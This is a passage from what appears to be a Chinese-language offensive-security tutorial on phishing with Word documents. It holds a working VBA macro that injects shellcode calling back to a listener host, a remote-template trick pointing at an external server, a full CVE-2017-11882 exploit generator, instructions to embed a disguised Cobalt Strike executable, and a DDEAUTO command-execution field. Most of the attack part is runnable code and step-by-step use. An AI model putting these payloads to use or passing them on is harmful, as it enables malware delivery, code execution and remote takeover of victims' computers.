&quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,78,98,119,53,0,17,-116,127,123,-80,105,69,14,82,-44,122,-27,-53,42,104,60,-120,-108,98,52,-62,95,-18,-112,16,111,20,3,-63,71,-7,118, _</span><br><span class="line">-3,-22,-113,-31,-125,-89,-52,25,40,-126,37,-56,35,-42,-31,-114,-111,68,-116,68,8,87,-118,-94,-88,108,38,84,9,33,50,126,64,75,-38,65,-84,-107,-125,11, _</span><br><span class="line">-27,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,83,86,49,59,32,46,78,69,84,32,67,76,82,32,50, _</span><br><span class="line">46,48,46,53,48,55,50,55,41,13,10,0,-6,-89,42,91,59,-3,-74,-45,-22,-76,49,37,-71,-60,-58,-82,-103,-18,21,-74,78,117,-3,-116,107,114,-34,-97, _</span><br><span class="line">-10,45,42,10,-96,63,86,66,49,-94,88,-116,-29,-60,53,-85,40,-96,103,-106,10,36,-104,-4,48,35,60,-69,126,14,38,66,22,-43,82,99,-66,74,-59,32, _</span><br><span class="line">-88,3,97,-80,-22,21,26,52,0,-38,5,75,12,-64,-118,72,-97,-32,-76,9,103,34,-8,45,-78,-103,125,-63,123,5,-40,66,-122,22,-80,-81,-71,-86,-24,2, _</span><br><span class="line">27,66,76,-93,-28,126,-5,-15,51,106,19,-37,33,122,31,-9,49,-71,-93,-17,-67,112,-12,-18,53,11,-93,20,-97,-82,-17,15,-97,-57,60,74,-74,81,-106,-101, _</span><br><span class="line">-71,13,71,-39,-126,81,-88,-84,71,109,-71,-25,-28,-58,72,4,-8,-13,81,9,-95,-118,-94,29,-48,-34,34,-106,-41,-13,-111,18,24,72,-121,53,34,12,-26,-38, _</span><br><span class="line">-117,-58,100,-76,8,46,-67,41,52,-14,-102,-7,103,91,-7,-22,-86,-123,71,-116,-53,93,100,101,-57,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,49,51,55,46,49,51,49,0,18,52,86,120)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>新建一个 word 文档，开启开发工具（文件-&gt;选项-&gt;自定义功能区-&gt;开发工具）</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021534695.png" alt="image-20231002153409633"></p>
<p>开发工具-&gt;Visual Basic</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021534159.png" alt="image-20231002153427111"></p>
<p>把上面生成的宏语言后门粘贴进去</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021534288.png" alt="image-20231002153447217"></p>
<p>保存时点击对话框的“否”</p>
<p>另存为Word 97-2003 文档格式，保证低版本word可以打开</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535215.png" alt="image-20231002153505159"></p>
<p>用word打开，靶机上线</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535883.png" alt="image-20231002153516828"></p>
<h3 id="注入远程恶意word模板"><a href="#注入远程恶意word模板" class="headerlink" title="注入远程恶意word模板"></a>注入远程恶意word模板</h3><p>可以把恶意的word文件放到自己的vps上，然后通过word可以加载网络上的word模板的功能加载vps上的word文件，达到绕过一部分杀软的检测，因为靶机上的word文件的确是人畜无害的。</p>
<p>按前面正常的word钓鱼步骤，在另存时保存为dotm格式即启用宏的word模板</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535882.png" alt="image-20231002153530839"></p>
<p>放到vps上，用 python3 -m http.server 8080 （python2: python -m SimpleHTTPServer 8080）开启简易web服务，确保靶机上用 <a target="_blank" rel="noopener" href="http://vpsip:8080/dy.dotm">http://vpsip:8080/dy.dotm</a> 能访问到</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535953.png" alt="image-20231002153541884"></p>
<p>打开word，加载模板创建一个word文件</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535540.png" alt="image-20231002153558479"></p>
<p>保存为docx格式，然后把生成的word文件后缀改为zip格式然后解压得到如下目录</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021536076.png" alt="image-20231002153609039"></p>
<p>打开 word&#x2F;_rels&#x2F;settings.xml.rels 文件，把Target字段内容改为dotm文件对应ur</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;http://49.0.251.11:8080/1.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt;</span><br></pre></td></tr></table></figure>

<p>把word文件压缩为zip，然后后缀改为docx</p>
<p>放在靶机上执行，启用宏，靶机会在 Cobalt Strike 上线</p>
<h3 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h3><p>栈溢出漏洞</p>
<p>可用版本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MicrosoftOffice 2000</span><br><span class="line">MicrosoftOffice 2003</span><br><span class="line">MicrosoftOffice 2007 Service Pack 3</span><br><span class="line">MicrosoftOffice 2010 Service Pack 2</span><br><span class="line">MicrosoftOffice 2013 Service Pack 1</span><br><span class="line">MicrosoftOffice 2016</span><br><span class="line">MicrosoftOffice 365</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Original poc :https://github.com/embedi/CVE-2017-11882</span><br><span class="line"># This version accepts a command with 109 bytes long in maximum.</span><br><span class="line"># Sorry I don&#x27;t know how to read the struct in objdata, hence I cannot modify the length parameter to aquire a arbitrary length code execution.</span><br><span class="line"># But that&#x27;s enough in exploitation. We can use regsvr32 to load sct file remotely.:)</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head=r&#x27;&#x27;&#x27;&#123;\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033&#123;\fonttbl&#123;\f0\fnil\fcharset0 Calibri;&#125;&#125;</span><br><span class="line">&#123;\*\generator Riched20 6.3.9600&#125;\viewkind4\uc1</span><br><span class="line">\pard\sa200\sl276\slmult1\f0\fs22\lang9&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">objclass=r&#x27;&#x27;&#x27;&#123;\object\objemb\objupdate&#123;\*\objclass Equation.3&#125;\objw380\objh260&#123;\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tail=r&#x27;&#x27;&#x27;</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span><br><span class="line">&#125;&#123;\result &#123;\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 &#123;\pict&#123;\*\picprop\shplid1025&#123;\sp&#123;\sn shapeType&#125;&#123;\sv 75&#125;&#125;&#123;\sp&#123;\sn fFlipH&#125;&#123;\sv 0&#125;&#125;</span><br><span class="line">&#123;\sp&#123;\sn fFlipV&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLockAspectRatio&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn pictureGray&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn pictureBiLevel&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fRecolorFillAsPicture&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fUseShapeAnchor&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fFilled&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fHitTestFill&#125;&#123;\sv 1&#125;&#125;</span><br><span class="line">&#123;\sp&#123;\sn fillShape&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn fillUseRect&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fNoFillHitTest&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLine&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fPreferRelativeResize&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn fReallyHidden&#125;&#123;\sv 0&#125;&#125;</span><br><span class="line">&#123;\sp&#123;\sn fScriptAnchor&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fFakeMaster&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fCameFromImgDummy&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLayoutInCell&#125;&#123;\sv 1&#125;&#125;&#125;\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span><br><span class="line">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307&#123;\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652&#125;0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span><br><span class="line">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000&#125;&#125;&#125;&#125;\par&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#0:  b8 44 eb 71 12          mov    eax,0x1271eb44</span><br><span class="line">#5:  ba 78 56 34 12          mov    edx,0x12345678</span><br><span class="line">#a:  31 d0                   xor    eax,edx</span><br><span class="line">#c:  8b 08                   mov    ecx,DWORD PTR [eax]</span><br><span class="line">#e:  8b 09                   mov    ecx,DWORD PTR [ecx]</span><br><span class="line">#10: 8b 09                   mov    ecx,DWORD PTR [ecx]</span><br><span class="line">#12: 66 83 c1 3c             add    cx,0x3c</span><br><span class="line">#16: 31 db                   xor    ebx,ebx</span><br><span class="line">#18: 53                      push   ebx</span><br><span class="line">#19: 51                      push   ecx</span><br><span class="line">#1a: be 64 3e 72 12          mov    esi,0x12723e64</span><br><span class="line">#1f: 31 d6                   xor    esi,edx</span><br><span class="line">#21: ff 16                   call   DWORD PTR [esi] // call WinExec</span><br><span class="line">#23: 53                      push   ebx</span><br><span class="line">#24: 66 83 ee 4c             sub    si,0x4c</span><br><span class="line">#28: ff 10                   call   DWORD PTR [eax] // call ExitProcess</span><br><span class="line">stage1=&quot;\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pads with nop</span><br><span class="line">stage1=stage1.ljust(44,&#x27;\x90&#x27;)</span><br><span class="line"></span><br><span class="line">def genrtf(cmd,r_head):</span><br><span class="line">    if len(cmd) &gt; 109:</span><br><span class="line">        print &quot;[!] Primitive command must be shorter than 109 bytes&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    payload=&#x27;\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ&#x27;</span><br><span class="line">    payload+=stage1</span><br><span class="line">    payload+=pack(&#x27;&lt;I&#x27;,0x00402114) # ret</span><br><span class="line">    payload+=&#x27;\x00&#x27;*2</span><br><span class="line">    payload+=cmd</span><br><span class="line">    payload=payload.ljust(197,&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">    return r_head+objclass+payload.encode(&#x27;hex&#x27;)+tail</span><br><span class="line"></span><br><span class="line">def getrheader(file):</span><br><span class="line">    input_file = open(file,&quot;r&quot;).read()</span><br><span class="line">    r_header = input_file.split(&quot;&#123;\*\datastore&quot;)[0]</span><br><span class="line">    return r_header</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&quot;PoC for CVE-2017-11882&quot;)</span><br><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command run in target system&quot;, required=True)</span><br><span class="line">    parser.add_argument(&#x27;-o&#x27;, &quot;--output&quot;, help=&quot;Output exploit rtf&quot;, required=True)</span><br><span class="line">    parser.add_argument(&quot;-i&quot;, &quot;--input&quot;, help=&quot;Input normal rtf.&quot;, required=False)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if args.input != None:</span><br><span class="line">        r_header = getrheader(args.input)</span><br><span class="line">    else:</span><br><span class="line">        r_header = head</span><br><span class="line"></span><br><span class="line">    with open(args.output,&#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(genrtf(args.cmd,r_header))</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    print &quot;[*] Done ! output file --&gt; &quot; + args.output </span><br><span class="line">python2 Command109b_CVE-2017-11882.py -c &quot;calc&quot; -o poc.doc</span><br></pre></td></tr></table></figure>

<p>生成 poc.doc 放到靶机上执行，靶机弹出计算机，可以把 calc 换成 powershell 下载后门命令</p>
<h3 id="word插入外部对象上线"><a href="#word插入外部对象上线" class="headerlink" title="word插入外部对象上线"></a>word插入外部对象上线</h3><p>插入-&gt;对象</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021536951.png" alt="image-20231002153629908"></p>
<p>插入 Cobalt Strike 生成的 exe 后门文件，然后显示为图标，更改图标，改个题注，可以把图标也换一下</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539742.png" alt="image-20231002153900683"></p>
<p>在word里面多出来这个</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539591.png" alt="image-20231002153913543"></p>
<p>点击后，靶机上线</p>
<h3 id="word文档构造DDE"><a href="#word文档构造DDE" class="headerlink" title="word文档构造DDE"></a>word文档构造DDE</h3><p>创建一个docx文档，然后快捷键 Ctrl+f9 快速创建一个域，在花括号填入如下指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;\/k calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539722.png" alt="image-20231002153925686"></p>
<p>放到靶机上执行，靶机会弹出计算机，可以把计算机换成其它上线命令</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539528.png" alt="image-20231002153935490"></p>
<p>比如用powershell上线，先生成木马</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539885.png" alt="image-20231002153944840"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539744.png" alt="image-20231002153957698"></p>
